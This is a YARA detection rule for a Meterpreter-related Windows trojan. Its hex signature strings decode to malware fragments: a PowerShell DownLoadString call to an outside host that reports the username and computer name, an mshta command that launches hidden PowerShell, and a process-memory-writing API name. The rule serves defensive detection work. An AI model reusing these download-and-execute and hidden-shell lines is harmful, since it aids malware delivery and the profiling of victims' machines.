
rule Trojan_Win32_Meterpreter_MSR{
	meta:
		description = "Trojan:Win32/Meterpreter!MSR,SIGNATURE_TYPE_PEHSTR,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {44 6f 77 6e 4c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 74 2e 61 6d 79 27 2b 27 6e 78 2e 63 6f 6d 2f 37 70 2e 70 68 70 3f 30 2e 38 2a 75 73 62 5f 6c 6e 6b 2a 25 75 73 65 72 6e 61 6d 65 25 2a 25 63 6f 6d 70 75 74 65 72 6e 61 6d 65 25 2a 27 2b 5b 45 6e 76 69 72 6f 6e 6d 65 6e 74 5d 3a 3a 4f 53 56 65 72 73 69 6f 6e 2e 76 65 72 73 69 6f 6e 2e 4d 61 6a 6f 72 29 3b 62 70 75 20 28 27 68 74 74 70 3a 2f 2f 74 2e 61 6d 79 27 2b 27 6e 78 2e 63 6f } //2 DownLoadString('http://t.amy'+'nx.com/7p.php?0.8*usb_lnk*%username%*%computername%*'+[Environment]::OSVersion.version.Major);bpu ('http://t.amy'+'nx.co
		$a_01_1 = {6d 73 68 74 61 20 76 62 73 63 72 69 70 74 3a 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 72 75 6e 28 22 63 6d 64 20 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 77 20 68 69 64 64 65 6e 20 49 45 } //1 mshta vbscript:createobject("wscript.shell").run("cmd /c powershell -w hidden IE
		$a_01_2 = {57 72 69 74 65 50 72 6f 63 65 73 73 4d 65 6d 6f 72 79 } //1 WriteProcessMemory
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}